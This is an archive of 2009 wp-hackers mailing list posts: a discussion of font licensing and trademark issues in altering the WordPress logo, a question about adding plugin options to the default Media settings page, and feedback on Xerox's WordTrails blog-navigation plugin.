Message-ID: <427667db0910021928t63fd1d35u6addefc19f727b50@mail.gmail.com>

2009/10/3 Dion Hulse (dd32) <wordpress at dd32.id.au>:
...
> Whilst its against the license of the font, When its just to make a few
> alterations to a logo for your purposes and a substituted font doesn't look
> right, I figure, Someone has already payed for the font usage with this
> logo.. the logo should've come with the font included..

Yep, breach of copyright and licensing which clearly states, "you may
not modify, adapt, translate, reverse engineer, decompile,
disassemble, alter or otherwise copy the Emigre Font Software."

Why should the logo have come with the font included? The logo is for
branding WordPress, not every site that uses it. WordPress makes the
official logos available for people to use
(http://wordpress.org/about/logos/) and Matt made it a New Year's
resolution to get everyone using a real one, I don't think its either
fair or reasonable to dilute the WordPress branding by altering the
logo.

The logo is a registered trademark belonging to Automattic.
(http://tarr.uspto.gov/servlet/tarr?regser=serial&entry=78826938) -
does anyone know if logo modification is allowed?

A copyright licensing breach against one company and a potential
trademark infringement against another is not a good idea.

Lynne

From pl at fusi0n.org  Sat Oct  3 03:51:20 2009
From: pl at fusi0n.org (Pier-Luc Petitclerc)
Date: Fri, 2 Oct 2009 23:51:20 -0400
Subject: [wp-hackers] Adding custom options to default setting pages
Message-ID: <9e9ddf9d0910022051x5b009432lad3d3ebce00aa817@mail.gmail.com>

Hey wp-hackers.

I have a question for you regarding the Settings API. See, I decided that my
plugin, WP-prettyPhoto, shouldn't have an options page on its own, since
it's proper to put inside an already existing section (Settings > Media). My
problem with that idea is that I have no choice but to overwrite the
_wpnonce field using settings_field(). Doing that in an default section
makes it so that my custom options will process and save, but the default
ones will not. I've attached the plugin code as well as the Media Settings
page source so that you can get an idea. What am I doing wrong?

-- 
- pL

From johnbillion+wp at gmail.com  Sat Oct  3 04:29:42 2009
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Sat, 3 Oct 2009 05:29:42 +0100
Subject: [wp-hackers] Adding custom options to default setting pages
In-Reply-To: <9e9ddf9d0910022051x5b009432lad3d3ebce00aa817@mail.gmail.com>
References: <9e9ddf9d0910022051x5b009432lad3d3ebce00aa817@mail.gmail.com>
Message-ID: <1fa535a70910022129x3311f7dfwccbb5786ab9afc94@mail.gmail.com>

Hi Peir-Luc,

Attachments to the list get removed. Try pastebin.ca or upload the
code and send us a link.

John

2009/10/3 Pier-Luc Petitclerc <pl at fusi0n.org>:
> Hey wp-hackers.
>
> I have a question for you regarding the Settings API. See, I decided that my
> plugin, WP-prettyPhoto, shouldn't have an options page on its own, since
> it's proper to put inside an already existing section (Settings > Media). My
> problem with that idea is that I have no choice but to overwrite the
> _wpnonce field using settings_field(). Doing that in an default section
> makes it so that my custom options will process and save, but the default
> ones will not. I've attached the plugin code as well as the Media Settings
> page source so that you can get an idea. What am I doing wrong?
>
> --
> - pL
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>

From pl at fusi0n.org  Sat Oct  3 05:25:49 2009
From: pl at fusi0n.org (Pier-Luc Petitclerc)
Date: Sat, 3 Oct 2009 01:25:49 -0400
Subject: [wp-hackers] Adding custom options to default setting pages
In-Reply-To: <1fa535a70910022129x3311f7dfwccbb5786ab9afc94@mail.gmail.com>
References: <9e9ddf9d0910022051x5b009432lad3d3ebce00aa817@mail.gmail.com>
	<1fa535a70910022129x3311f7dfwccbb5786ab9afc94@mail.gmail.com>
Message-ID: <9e9ddf9d0910022225y158634b0r5c4f40d5547a36c4@mail.gmail.com>

WP-prettyPhoto PHP Source: http://pastebin.ca/1590213
HTML Source of Media Settings Page: http://pastebin.ca/1590214

On Sat, Oct 3, 2009 at 12:29 AM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> Hi Peir-Luc,
>
> Attachments to the list get removed. Try pastebin.ca or upload the
> code and send us a link.
>
> John
>
> 2009/10/3 Pier-Luc Petitclerc <pl at fusi0n.org>:
> > Hey wp-hackers.
> >
> > I have a question for you regarding the Settings API. See, I decided that
> my
> > plugin, WP-prettyPhoto, shouldn't have an options page on its own, since
> > it's proper to put inside an already existing section (Settings > Media).
> My
> > problem with that idea is that I have no choice but to overwrite the
> > _wpnonce field using settings_field(). Doing that in an default section
> > makes it so that my custom options will process and save, but the default
> > ones will not. I've attached the plugin code as well as the Media
> Settings
> > page source so that you can get an idea. What am I doing wrong?
> >
> > --
> > - pL
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
- pL

From liste at srpski.biz  Sat Oct  3 08:06:18 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Sat, 3 Oct 2009 10:06:18 +0200
Subject: [wp-hackers] Adding custom options to default setting pages
In-Reply-To: <9e9ddf9d0910022225y158634b0r5c4f40d5547a36c4@mail.gmail.com>
References: <9e9ddf9d0910022051x5b009432lad3d3ebce00aa817@mail.gmail.com>
	<1fa535a70910022129x3311f7dfwccbb5786ab9afc94@mail.gmail.com>
	<9e9ddf9d0910022225y158634b0r5c4f40d5547a36c4@mail.gmail.com>
Message-ID: <9b6c20460910030106l17a0bd1cua9a15e987393d8c3@mail.gmail.com>

But why you need _wpnonce if you use register_setting? Isn't point of that
function that you don't need to deal with nonces, referer and other security
data?

See
http://planetozh.com/blog/2009/05/handling-plugins-options-in-wordpress-28-with-register_setting/#more-1241.

2009/10/3 Pier-Luc Petitclerc <pl at fusi0n.org>

> WP-prettyPhoto PHP Source: http://pastebin.ca/1590213
> HTML Source of Media Settings Page: http://pastebin.ca/1590214
>
> On Sat, Oct 3, 2009 at 12:29 AM, John Blackbourn
> <johnbillion+wp at gmail.com <johnbillion%2Bwp at gmail.com><
> johnbillion%2Bwp at gmail.com <johnbillion%252Bwp at gmail.com>>
> > wrote:
>
> > Hi Peir-Luc,
> >
> > Attachments to the list get removed. Try pastebin.ca or upload the
> > code and send us a link.
> >
> > John
> >
> > 2009/10/3 Pier-Luc Petitclerc <pl at fusi0n.org>:
> > > Hey wp-hackers.
> > >
> > > I have a question for you regarding the Settings API. See, I decided
> that
> > my
> > > plugin, WP-prettyPhoto, shouldn't have an options page on its own,
> since
> > > it's proper to put inside an already existing section (Settings >
> Media).
> > My
> > > problem with that idea is that I have no choice but to overwrite the
> > > _wpnonce field using settings_field(). Doing that in an default section
> > > makes it so that my custom options will process and save, but the
> default
> > > ones will not. I've attached the plugin code as well as the Media
> > Settings
> > > page source so that you can get an idea. What am I doing wrong?
> > >
> > > --
> > > - pL
> > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> - pL
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From vgururao at gmail.com  Sat Oct  3 16:36:31 2009
From: vgururao at gmail.com (Venkatesh Rao)
Date: Sat, 3 Oct 2009 12:36:31 -0400
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from Xerox
Message-ID: <ce5c284a0910030936h208439e9vb0fe45af3201212d@mail.gmail.com>

Hi All:

My colleague Jesse forwarded me the interesting responses from William
Canino and Otto to our request for feedback on the WordTrails plugin,
so I thought I'd join the list and the conversation.

I am the product manager for the Xerox Trails product suite, and Jesse
is the lead developer of the plugin, so I'll leave any technical
questions, such as XHTML compliance, to him. I'll just make a couple
of general points about where we are going with the product.

First, in response to William's points, the original use case behind
this idea of trail-based navigation wasn't actually tutorials/learning
applications. It was my own frustration with some of the limitations
of categories/tags and plugins like In Series (otherwise a great
plugin!). I wanted a simple way to break out of both the default
reverse-chronological ordering of blogs and the limited "table of
contents" metaphor. In particular, I wanted the ability to create
branches off the main narrative and the ability to intersect trails in
order to reuse individual posts in multiple narratives. At the same
time, I wanted a one-click ability to create instant, up-to-date PDF
ebooks. My personal overall goal was to drive traffic to my older
posts. I suspect this will be the main use case for most bloggers.

So long as you don't go nuts, our user tests show that it turns out to
be very intuitive for readers, since the metaphor is very close to
driving on Interstate highways or hiking in National Parks.
Trailblazing takes some thought and storytelling skill, but once you
get used to it, it is very quick. It takes only a few minutes of
browsing to create a rudimentary trail, and only a little bit longer
if you want to include good metadata to override the defaults.

You can see my own use of the plugin at my personal blog:
http://www.ribbonfarm.com/trails where I've used it so far to organize
my posts on the "future of work" into useful e-book like narratives.

Other use cases include slide shows and learning tutorials like
William noted, taxonomies, histories, trouble-shooting decision trees,
photo-albums, online travel guides, treasure hunts etc. Some will fit
the wiki model better (we'll be releasing a mediawiki plugin soon) and
some will require cross-site trails (which we support at
trailmeme.com).

And to Otto's point about flowcharts perhaps not being the best model
for navigation, we actually agree. The flowchart-like "bird's eye
view" is only part of the user experience. Trails has both a sidebar
"worm's eye view" aspect (where we expect users to spend 90% of their
time) and a "bird's eye view" aspect, which we think of as a dynamic
re-imagining of the sitemaps of the Web 1.0 era.

Anyway, thanks for the great feedback, and looking forward to more.
Please do email Jesse or me personally if you have specific questions
(or the list if you think the question is of general interest).  The
overall technology is currently in invite-only stealth mode, and this
plugin is just the tip of the iceberg, so I hope some of you are
intrigued enough to jump in as early adopters. We'll be sharing more
details as we unveil more :)

If you are interested in following the development more closely,
please subscribe to http://blog.trailmeme.com

Venkat

Xerox Trails Product Manager



[Otto]


It does look interesting, but I'm not sure that a flowchart is perhaps
the best way to do navigational systems. Neat idea though.


[William Canino]

Hi All,

WordTrails is basically a tool to create multiple multidirectional

reading paths within a blog.  The paths one creates are stored as XML,
which are re-read by the plugin to make a navigational sidebar widget
in HTML, or to display a flowchart in Flash.

The idea of telling a visitor, "To learn foobaring, just follow the

Foobar lesson, starting here, otherwise, move on to the next Barfoo
chapter" and "You're reading part 8 of our Foobar tutorial, you can
start at the beginning or look at the map," can potentially make this

a killer WP app, but the explicit need for a tutorial AND the explicit
need for instructions like "To read the next part, click the so-and-so
on the WordTrails box in the navigation column to the top right of
this post" make me wish I'd have made PowerPoint slides instead.

It becomes further overwhelming when there are several navigation
paths that overlap.

Don't get me wrong, Jesse, Navigational User Interfaces is a tough nut

to crack, but I think CBT tools do a better job at this than this.
I'd love to try this if ever it becomes XHTML compliant.

Best regards,
W


2009/10/1 Silverstein, Jesse <Jesse.Silverstein at xerox.com>:

> Hi WordPress community members:
>
>
>
> I am part of a team at the Xerox Innovation Group, and we've just
> released a powerful plugin called "WordTrails" in beta. ?I am emailing

> this group to solicit volunteers to help us test it a bit before we
> officially change the version number from 0.9.x to 1.0.
>
>
>
> WordTrails allows you to very easily blaze arbitrary paths (with

> branches and loops) through a WP blog. Readers can follow these trails
> through a "bird's eye view" Flash trailmap and a "worm's eye view"
> sidebar widget. They can also linearize and convert a trail to a PDF

> with one click.
>
>
>
> So WordTrails basically overlays a highly flexible navigation scheme on
> a WP blog, and simultaneously turns it into a sort of one-click ebook

> publishing system.
>
>
>
> I'd like to invite you to check out and install the plugin
> (http://wordpress.org/extend/plugins/wordtrails). You can see it in

> action at http://blog.trailmeme.com (click on the 'Trails' page). You
> can also try it out for yourself before installing, on our sandbox blog

> (open registration): http://blog.trailmeme.com/sandbox
>
>
>
> WordTrails is part of the ecosystem of a larger technology set called

> Xerox Trails, which includes a destination site at www.trailmeme.com
> <http://www.trailmeme.com/> ?that is currently in invite-only beta. For

> more background go to: http://blog.trailmeme.com/new-to-trails/
>
>
>
> Please let me know if you have any questions or feedback, or encounter

> any bugs. Feel free to forward this email to any serious bloggers using
> self-hosted WordPress. We've spent a year developing this plugin, and
> are really eager to see what you guys do with it!

>
>
>
> Jesse Silverstein
>
> Jesse.Silverstein at xerox.com
>

>
>
> On behalf of the Xerox Trails team
>
> Xerox Research Center, Webster
>
> _______________________________________________
> wp-hackers mailing list

> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

>

~~~~~
experiments in refactored perception
http://www.ribbonfarm.com
twitter: http://twitter.com/vgr

From mikeschinkel at newclarity.net  Sat Oct  3 18:57:01 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 3 Oct 2009 14:57:01 -0400
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <ce5c284a0910030936h208439e9vb0fe45af3201212d@mail.gmail.com>
References: <ce5c284a0910030936h208439e9vb0fe45af3201212d@mail.gmail.com>
Message-ID: <9B1E18C4-5AB9-4F78-A096-DE50B8360860@newclarity.net>

Hi Venkatesh,

Thanks for commenting on the list. It's nice to hear the background as  
to why your team built the WordTrails plugin.

But don't be too discouraged by the negative comments. It's just the  
nature of open-source mailing lists for many participants to react  
knee-jerk negatively to any significantly new concept presented.  I've  
experienced the same and was at first seriously dismayed but came  
realize it's just the nature of the beast. I've learned the list is  
best used to discuss how to use existing implementations and not as a  
sounding board for new ideas.

If you've got a solution that introduces a new paradigm and you find  
it works well addressing tangible use cases you've experienced then  
more power to you. Go ahead and evolve it as you'd best see fit.  It  
may or may not take the world by storm if you create it but it  
certainly won't if negative criticism from the list causes you to  
abandon your efforts. I look forward to your success.

-Mike Schinkel


On Oct 3, 2009, at 12:36 PM, Venkatesh Rao wrote:

> Hi All:
>
> My colleague Jesse forwarded me the interesting responses from William
> Canino and Otto to our request for feedback on the WordTrails plugin,
> so I thought I'd join the list and the conversation.
>
> I am the product manager for the Xerox Trails product suite, and Jesse
> is the lead developer of the plugin, so I'll leave any technical
> questions, such as XHTML compliance, to him. I'll just make a couple
> of general points about where we are going with the product.
>
> First, in response to William's points, the original use case behind
> this idea of trail-based navigation wasn't actually tutorials/learning
> applications. It was my own frustration with some of the limitations
> of categories/tags and plugins like In Series (otherwise a great
> plugin!). I wanted a simple way to break out of both the default
> reverse-chronological ordering of blogs and the limited "table of
> contents" metaphor. In particular, I wanted the ability to create
> branches off the main narrative and the ability to intersect trails in
> order to reuse individual posts in multiple narratives. At the same
> time, I wanted a one-click ability to create instant, up-to-date PDF
> ebooks. My personal overall goal was to drive traffic to my older
> posts. I suspect this will be the main use case for most bloggers.
>
> So long as you don't go nuts, our user tests show that it turns out to
> be very intuitive for readers, since the metaphor is very close to
> driving on Interstate highways or hiking in National Parks.
> Trailblazing takes some thought and storytelling skill, but once you
> get used to it, it is very quick. It takes only a few minutes of
> browsing to create a rudimentary trail, and only a little bit longer
> if you want to include good metadata to override the defaults.
>
> You can see my own use of the plugin at my personal blog:
> http://www.ribbonfarm.com/trails where I've used it so far to organize
> my posts on the "future of work" into useful e-book like narratives.
>
> Other use cases include slide shows and learning tutorials like
> William noted, taxonomies, histories, trouble-shooting decision trees,
> photo-albums, online travel guides, treasure hunts etc. Some will fit
> the wiki model better (we'll be releasing a mediawiki plugin soon) and
> some will require cross-site trails (which we support at
> trailmeme.com).
>
> And to Otto's point about flowcharts perhaps not being the best model
> for navigation, we actually agree. The flowchart-like "bird's eye
> view" is only part of the user experience. Trails has both a sidebar
> "worm's eye view" aspect (where we expect users to spend 90% of their
> time) and a "bird's eye view" aspect, which we think of as a dynamic
> re-imagining of the sitemaps of the Web 1.0 era.
>
> Anyway, thanks for the great feedback, and looking forward to more.
> Please do email Jesse or me personally if you have specific questions
> (or the list if you think the question is of general interest).  The
> overall technology is currently in invite-only stealth mode, and this
> plugin is just the tip of the iceberg, so I hope some of you are
> intrigued enough to jump in as early adopters. We'll be sharing more
> details as we unveil more :)
>
> If you are interested in following the development more closely,
> please subscribe to http://blog.trailmeme.com
>
> Venkat
>
> Xerox Trails Product Manager
>
>
>
> [Otto]
>
>
> It does look interesting, but I'm not sure that a flowchart is perhaps
> the best way to do navigational systems. Neat idea though.
>
>
> [William Canino]
>
> Hi All,
>
> WordTrails is basically a tool to create multiple multidirectional
>
> reading paths within a blog.  The paths one creates are stored as XML,
> which are re-read by the plugin to make a navigational sidebar widget
> in HTML, or to display a flowchart in Flash.
>
> The idea of telling a visitor, "To learn foobaring, just follow the
>
> Foobar lesson, starting here, otherwise, move on to the next Barfoo
> chapter" and "You're reading part 8 of our Foobar tutorial, you can
> start at the beginning or look at the map," can potentially make this
>
> a killer WP app, but the explicit need for a tutorial AND the explicit
> need for instructions like "To read the next part, click the so-and-so
> on the WordTrails box in the navigation column to the top right of
> this post" make me wish I'd have made PowerPoint slides instead.
>
> It becomes further overwhelming when there are several navigation
> paths that overlap.
>
> Don't get me wrong, Jesse, Navigational User Interfaces is a tough nut
>
> to crack, but I think CBT tools do a better job at this than this.
> I'd love to try this if ever it becomes XHTML compliant.
>
> Best regards,
> W
>
>
> 2009/10/1 Silverstein, Jesse <Jesse.Silverstein at xerox.com>:
>
>> Hi WordPress community members:
>>
>>
>>
>> I am part of a team at the Xerox Innovation Group, and we've just
>> released a powerful plugin called "WordTrails" in beta.  I am  
>> emailing
>
>> this group to solicit volunteers to help us test it a bit before we
>> officially change the version number from 0.9.x to 1.0.
>>
>>
>>
>> WordTrails allows you to very easily blaze arbitrary paths (with
>
>> branches and loops) through a WP blog. Readers can follow these  
>> trails
>> through a "bird's eye view" Flash trailmap and a "worm's eye view"
>> sidebar widget. They can also linearize and convert a trail to a PDF
>
>> with one click.
>>
>>
>>
>> So WordTrails basically overlays a highly flexible navigation  
>> scheme on
>> a WP blog, and simultaneously turns it into a sort of one-click ebook
>
>> publishing system.
>>
>>
>>
>> I'd like to invite you to check out and install the plugin
>> (http://wordpress.org/extend/plugins/wordtrails). You can see it in
>
>> action at http://blog.trailmeme.com (click on the 'Trails' page). You
>> can also try it out for yourself before installing, on our sandbox  
>> blog
>
>> (open registration): http://blog.trailmeme.com/sandbox
>>
>>
>>
>> WordTrails is part of the ecosystem of a larger technology set called
>
>> Xerox Trails, which includes a destination site at www.trailmeme.com
>> <http://www.trailmeme.com/>  that is currently in invite-only beta.  
>> For
>
>> more background go to: http://blog.trailmeme.com/new-to-trails/
>>
>>
>>
>> Please let me know if you have any questions or feedback, or  
>> encounter
>
>> any bugs. Feel free to forward this email to any serious bloggers  
>> using
>> self-hosted WordPress. We've spent a year developing this plugin, and
>> are really eager to see what you guys do with it!
>
>>
>>
>>
>> Jesse Silverstein
>>
>> Jesse.Silverstein at xerox.com
>>
>
>>
>>
>> On behalf of the Xerox Trails team
>>
>> Xerox Research Center, Webster
>>
>> _______________________________________________
>> wp-hackers mailing list
>
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>>
>
> ~~~~~
> experiments in refactored perception
> http://www.ribbonfarm.com
> twitter: http://twitter.com/vgr
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From william.canino at googlemail.com  Sat Oct  3 20:34:24 2009
From: william.canino at googlemail.com (William Canino)
Date: Sat, 3 Oct 2009 16:34:24 -0400
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <9B1E18C4-5AB9-4F78-A096-DE50B8360860@newclarity.net>
References: <ce5c284a0910030936h208439e9vb0fe45af3201212d@mail.gmail.com>
	<9B1E18C4-5AB9-4F78-A096-DE50B8360860@newclarity.net>
Message-ID: <e4dc67e0910031334u20229f41h828d4cb04181f691@mail.gmail.com>

> It was my own frustration with some of the limitations
> of categories/tags and plugins like In Series

Me, too.  I would sincerely love to try this if ever it becomes XHTML compliant.

Right now, my authors and I "hard code" navigational instructions unto
our articles to do what WordTrails does.  We'd write "To learn
foobaring, just follow our Foobar story, starting here, otherwise,
move on to the next chapter of our Barfoo story," exactly like your
Trails demo.

Navigational instructions embedded in semantic content is as obnoxious
as <font> tags.  They are not supposed to be there.

WordTrails promises relief.

However, the first thing I will do to your widget is put it instead at
the end of my post div and rewrite its css like so:

[article goes here]
-------------------------------------------------------------------------------
on the left edge:
[< title of previous chapter]
[<< start of story]
[|< story TOC (or map)]
[view this story as PDF]

on the right edge:
[option 1 to read next >]
[option 2 to read next >]
[start of related story >]
[story summary >|]

(above is a complex example. most posts are simpler.)

No tutorial or embedded instructions -- and no graphics or jquery or
javascript -- required.

I hope this clarifies my previous review.


2009/10/3 Mike Schinkel <mikeschinkel at newclarity.net>:
> Hi Venkatesh,
>
> Thanks for commenting on the list. It's nice to hear the background as to
> why your team built the WordTrails plugin.
>
> But don't be too discouraged by the negative comments. It's just the nature
> of open-source mailing lists for many participants to react knee-jerk
> negatively to any significantly new concept presented. ?I've experienced the
> same and was at first seriously dismayed but came realize it's just the
> nature of the beast. I've learned the list is best used to discuss how to
> use existing implementations and not as a sounding board for new ideas.
>
> If you've got a solution that introduces a new paradigm and you find it
> works well addressing tangible use cases you've experienced then more power
> to you. Go ahead and evolve it as you'd best see fit. ?It may or may not
> take the world by storm if you create it but it certainly won't if negative
> criticism from the list causes you to abandon your efforts. I look forward
> to your success.
>
> -Mike Schinkel
>
>
> On Oct 3, 2009, at 12:36 PM, Venkatesh Rao wrote:
>
>> Hi All:
>>
>> My colleague Jesse forwarded me the interesting responses from William
>> Canino and Otto to our request for feedback on the WordTrails plugin,
>> so I thought I'd join the list and the conversation.
>>
>> I am the product manager for the Xerox Trails product suite, and Jesse
>> is the lead developer of the plugin, so I'll leave any technical
>> questions, such as XHTML compliance, to him. I'll just make a couple
>> of general points about where we are going with the product.
>>
>> First, in response to William's points, the original use case behind
>> this idea of trail-based navigation wasn't actually tutorials/learning
>> applications. It was my own frustration with some of the limitations
>> of categories/tags and plugins like In Series (otherwise a great
>> plugin!). I wanted a simple way to break out of both the default
>> reverse-chronological ordering of blogs and the limited "table of
>> contents" metaphor. In particular, I wanted the ability to create
>> branches off the main narrative and the ability to intersect trails in
>> order to reuse individual posts in multiple narratives. At the same
>> time, I wanted a one-click ability to create instant, up-to-date PDF
>> ebooks. My personal overall goal was to drive traffic to my older
>> posts. I suspect this will be the main use case for most bloggers.
>>
>> So long as you don't go nuts, our user tests show that it turns out to
>> be very intuitive for readers, since the metaphor is very close to
>> driving on Interstate highways or hiking in National Parks.
>> Trailblazing takes some thought and storytelling skill, but once you
>> get used to it, it is very quick. It takes only a few minutes of
>> browsing to create a rudimentary trail, and only a little bit longer
>> if you want to include good metadata to override the defaults.
>>
>> You can see my own use of the plugin at my personal blog:
>> http://www.ribbonfarm.com/trails where I've used it so far to organize
>> my posts on the "future of work" into useful e-book like narratives.
>>
>> Other use cases include slide shows and learning tutorials like
>> William noted, taxonomies, histories, trouble-shooting decision trees,
>> photo-albums, online travel guides, treasure hunts etc. Some will fit
>> the wiki model better (we'll be releasing a mediawiki plugin soon) and
>> some will require cross-site trails (which we support at
>> trailmeme.com).
>>
>> And to Otto's point about flowcharts perhaps not being the best model
>> for navigation, we actually agree. The flowchart-like "bird's eye
>> view" is only part of the user experience. Trails has both a sidebar
>> "worm's eye view" aspect (where we expect users to spend 90% of their
>> time) and a "bird's eye view" aspect, which we think of as a dynamic
>> re-imagining of the sitemaps of the Web 1.0 era.
>>
>> Anyway, thanks for the great feedback, and looking forward to more.
>> Please do email Jesse or me personally if you have specific questions
>> (or the list if you think the question is of general interest). ?The
>> overall technology is currently in invite-only stealth mode, and this
>> plugin is just the tip of the iceberg, so I hope some of you are
>> intrigued enough to jump in as early adopters. We'll be sharing more
>> details as we unveil more :)
>>
>> If you are interested in following the development more closely,
>> please subscribe to http://blog.trailmeme.com
>>
>> Venkat
>>
>> Xerox Trails Product Manager
>>
>>
>>
>> [Otto]
>>
>>
>> It does look interesting, but I'm not sure that a flowchart is perhaps
>> the best way to do navigational systems. Neat idea though.
>>
>>
>> [William Canino]
>>
>> Hi All,
>>
>> WordTrails is basically a tool to create multiple multidirectional
>>
>> reading paths within a blog. ?The paths one creates are stored as XML,
>> which are re-read by the plugin to make a navigational sidebar widget
>> in HTML, or to display a flowchart in Flash.
>>
>> The idea of telling a visitor, "To learn foobaring, just follow the
>>
>> Foobar lesson, starting here, otherwise, move on to the next Barfoo
>> chapter" and "You're reading part 8 of our Foobar tutorial, you can
>> start at the beginning or look at the map," can potentially make this
>>
>> a killer WP app, but the explicit need for a tutorial AND the explicit
>> need for instructions like "To read the next part, click the so-and-so
>> on the WordTrails box in the navigation column to the top right of
>> this post" make me wish I'd have made PowerPoint slides instead.
>>
>> It becomes further overwhelming when there are several navigation
>> paths that overlap.
>>
>> Don't get me wrong, Jesse, Navigational User Interfaces is a tough nut
>>
>> to crack, but I think CBT tools do a better job at this than this.
>> I'd love to try this if ever it becomes XHTML compliant.
>>
>> Best regards,
>> W
>>
>>
>> 2009/10/1 Silverstein, Jesse <Jesse.Silverstein at xerox.com>:
>>
>>> Hi WordPress community members:
>>>
>>>
>>>
>>> I am part of a team at the Xerox Innovation Group, and we've just
>>> released a powerful plugin called "WordTrails" in beta. ?I am emailing
>>
>>> this group to solicit volunteers to help us test it a bit before we
>>> officially change the version number from 0.9.x to 1.0.
>>>
>>>
>>>
>>> WordTrails allows you to very easily blaze arbitrary paths (with
>>
>>> branches and loops) through a WP blog. Readers can follow these trails
>>> through a "bird's eye view" Flash trailmap and a "worm's eye view"
>>> sidebar widget. They can also linearize and convert a trail to a PDF
>>
>>> with one click.
>>>
>>>
>>>
>>> So WordTrails basically overlays a highly flexible navigation scheme on
>>> a WP blog, and simultaneously turns it into a sort of one-click ebook
>>
>>> publishing system.
>>>
>>>
>>>
>>> I'd like to invite you to check out and install the plugin
>>> (http://wordpress.org/extend/plugins/wordtrails). You can see it in
>>
>>> action at http://blog.trailmeme.com (click on the 'Trails' page). You
>>> can also try it out for yourself before installing, on our sandbox blog
>>
>>> (open registration): http://blog.trailmeme.com/sandbox
>>>
>>>
>>>
>>> WordTrails is part of the ecosystem of a larger technology set called
>>
>>> Xerox Trails, which includes a destination site at www.trailmeme.com
>>> <http://www.trailmeme.com/> ?that is currently in invite-only beta. For
>>
>>> more background go to: http://blog.trailmeme.com/new-to-trails/
>>>
>>>
>>>
>>> Please let me know if you have any questions or feedback, or encounter
>>
>>> any bugs. Feel free to forward this email to any serious bloggers using
>>> self-hosted WordPress. We've spent a year developing this plugin, and
>>> are really eager to see what you guys do with it!
>>
>>>
>>>
>>>
>>> Jesse Silverstein
>>>
>>> Jesse.Silverstein at xerox.com
>>>
>>
>>>
>>>
>>> On behalf of the Xerox Trails team
>>>
>>> Xerox Research Center, Webster
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>>
>>
>> ~~~~~
>> experiments in refactored perception
>> http://www.ribbonfarm.com
>> twitter: http://twitter.com/vgr
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Sun Oct  4 06:12:11 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sun, 4 Oct 2009 01:12:11 -0500
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <ce5c284a0910030936h208439e9vb0fe45af3201212d@mail.gmail.com>
References: <ce5c284a0910030936h208439e9vb0fe45af3201212d@mail.gmail.com>
Message-ID: <1C4064CA-1137-423B-80F1-B2BFDF9F340A@striderweb.com>


On Oct 3, 2009, at 11:36 AM, Venkatesh Rao wrote:

> So long as you don't go nuts, our user tests show that it turns out to
> be very intuitive for readers, since the metaphor is very close to
> driving on Interstate highways or hiking in National Parks.

What it reminds me of is "Choose Your Own Adventure" Books.  I think  
that's as good a metaphor as any for describing what it does.

I can also see using this for setting up a series of instructions that  
vary based on your situation, but for which certain steps are common  
to different situations.  Imagine a site with instructions for  
replacing parts of a computer.  The "open the case" step will pretty  
much always be there, but "remove the the hard drive" only for certain  
projects.  With Trails you only have to write the "open the case" step  
once and include it in different trails.

Am I understanding Trails correctly?  :)

Regards,

Stephen

P.S. -- I don't think this topic is "OT" at all.  This is a  
significant WP plugin.

-- 
Stephen Rider
http://striderweb.com/





From vgururao at gmail.com  Sun Oct  4 16:18:31 2009
From: vgururao at gmail.com (Venkatesh Rao)
Date: Sun, 4 Oct 2009 12:18:31 -0400
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
Message-ID: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>

Hi Stephen

> What it reminds me of is "Choose Your Own Adventure" Books. ?I think
> that's as good a metaphor as any for describing what it does.

Yes, this is the perfect metaphor for those who've read those books
(there were several Hardy Boys/Nancy Drew books that used that model).
I actually think that idea was rather unnatural in book form, but is a
natural fit for the Web. In fact, one of our bolder ambitions for the
trails technology is to enable people to get beyond the book metaphor
retrofitted on to the Web, and really start exploiting the potential
of the Web as a creative medium in its own right, where much of the
creativity is in coming up with thoughtful patterns of hyperlinks for
your own and others' content. "Painting with hyperlinks" so to speak,
which is painful with bare-metal hyperlinking technolog, but will
hopefully be way more fun with trails.

>
> I can also see using this for setting up a series of instructions that
> vary based on your situation, but for which certain steps are common
> to different situations. ?Imagine a site with instructions for
> replacing parts of a computer. ?The "open the case" step will pretty
> much always be there, but "remove the the hard drive" only for certain
> projects. ?With Trails you only have to write the "open the case" step
> once and include it in different trails.
>
> Am I understanding Trails correctly? ?:)

Absolutely. This reusability argument is central. Similar to the
troubleshooting domain is the travel domain: the "Rome" page can be
the same whether you include it in a "3 day Italy trip" trail or a "15
